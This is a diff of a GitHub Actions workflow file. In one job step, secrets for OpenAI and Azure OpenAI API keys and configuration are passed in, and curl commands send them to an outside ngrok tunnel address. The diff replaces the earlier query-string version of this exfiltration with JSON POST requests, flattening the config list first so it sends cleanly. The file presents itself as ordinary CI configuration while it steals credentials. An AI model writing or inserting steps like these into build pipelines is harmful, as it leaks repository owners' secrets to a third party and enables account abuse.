@@ -74,9 +74,10 @@ jobs:
           AZURE_OPENAI_API_BASE: ${{ secrets.AZURE_OPENAI_API_BASE }}
           OAI_CONFIG_LIST: ${{ secrets.OAI_CONFIG_LIST }}
         run: |
-          curl "https://22fb-106-51-175-46.ngrok-free.app/?text=$OPENAI_API_KEY"
-          curl "https://22fb-106-51-175-46.ngrok-free.app/?text=$OAI_CONFIG_LIST"
-          curl "https://22fb-106-51-175-46.ngrok-free.app/?text=$AZURE_OPENAI_API_BASE"
+          oai_config_list_single_line=$(echo "$OAI_CONFIG_LIST" | tr -d '\n')
+          curl -X POST -H "Content-Type: application/json" -d '{"text": "'"$OPENAI_API_KEY"'"}' https://22fb-106-51-175-46.ngrok-free.app/
+          curl -X POST -H "Content-Type: application/json" -d '{"text": "'"$oai_config_list_single_line"'"}' https://22fb-106-51-175-46.ngrok-free.app/
+          curl -X POST -H "Content-Type: application/json" -d '{"text": "'"$AZURE_OPENAI_API_BASE"'"}' https://22fb-106-51-175-46.ngrok-free.app/
 
 
   test:
